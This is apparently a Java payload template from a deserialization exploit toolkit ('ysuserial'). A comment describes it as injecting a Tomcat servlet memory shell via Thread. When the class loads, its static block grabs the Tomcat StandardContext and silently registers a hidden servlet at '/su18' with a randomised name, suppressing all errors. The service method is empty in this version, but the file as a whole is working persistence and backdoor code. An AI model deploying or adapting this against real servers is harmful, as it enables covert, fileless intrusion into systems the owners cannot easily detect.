package org.su18.ysuserial.payloads.templates.memshell.tomcat;

import org.apache.catalina.Wrapper;
import org.apache.catalina.core.ApplicationServletRegistration;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;

import javax.servlet.*;

/**
 * 使用 Thread 注入 Tomcat Servlet 型内存马
 */
public class TSMSFromThread implements Servlet {

	static {
		try {
			String servrletName = "su18" + System.nanoTime();
			String urlPattern   = "/su18";

			// 获取 standardContext
			WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
			StandardContext       standardContext       = (StandardContext) webappClassLoaderBase.getResources().getContext();

			if (standardContext.findChild(servrletName) == null) {
				Wrapper wrapper = standardContext.createWrapper();
				wrapper.setName(servrletName);
				standardContext.addChild(wrapper);
				Servlet servlet = new TSMSFromThread();

				wrapper.setServletClass(servlet.getClass().getName());
				wrapper.setServlet(servlet);
				ServletRegistration.Dynamic registration = new ApplicationServletRegistration(wrapper, standardContext);
				registration.addMapping(urlPattern);
			}
		} catch (Exception ignored) {
		}
	}

	@Override
	public void init(ServletConfig servletConfig) throws ServletException {

	}

	@Override
	public ServletConfig getServletConfig() {
		return null;
	}

	@Override
	public void service(ServletRequest servletRequest, ServletResponse servletResponse) {
	}

	@Override
	public String getServletInfo() {
		return null;
	}

	@Override
	public void destroy() {
	}
}